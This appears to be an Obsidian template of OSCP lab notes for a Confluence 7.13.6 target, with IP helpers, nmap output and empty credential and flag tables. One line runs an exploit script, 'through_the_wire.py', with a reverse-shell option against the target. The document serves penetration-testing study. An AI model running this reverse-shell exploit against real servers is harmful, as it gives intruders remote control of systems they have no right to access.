IP::   192.168.138.41

| Machine | IP Address | Notes |
| ------- | ---------- | ----- |
|         |            |       |

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
KALI IP::  192.168.45.232
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `${KaliIP}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Web Address
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
Discovered Web Domain::   192.168.138.41

http://192.168.138.41:8090/login.action
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `http://${discoveredDomain}/`;

dv.paragraph("```bash\n" + command + "\n```");
```
[[Editing Page]]

wget from local python server
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8888/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```
## Provided Credentials
---

```
python3 through_the_wire.py --rhost 192.168.138.41 --rport 8090 --lhost 192.168.45.232 --protocol http:// --reverse-shell
```

```

```

---
## Software Versions


Atlassian Confluence 7.13.6




---



## Open Ports
---
PORT     STATE SERVICE  VERSION                                                                                     
22/tcp   open  ssh      OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)                                
| ssh-hostkey:                                                                                                                                                    
8090/tcp open  http     Apache Tomcat (language: en)                                                                
| http-title: Log In - Confluence                                                                                   
|_Requested resource was /login.action?               
8091/tcp open  jamlink?                                                                                                                                        
|     Server: Aleph/0.4.6                                                                                           


| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

---

## Discovered Subdomains
---


---

## Discovered Credentials
---

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---

## Attack Angles
---


---

## User Flag

```

```

## Root Flag

```

```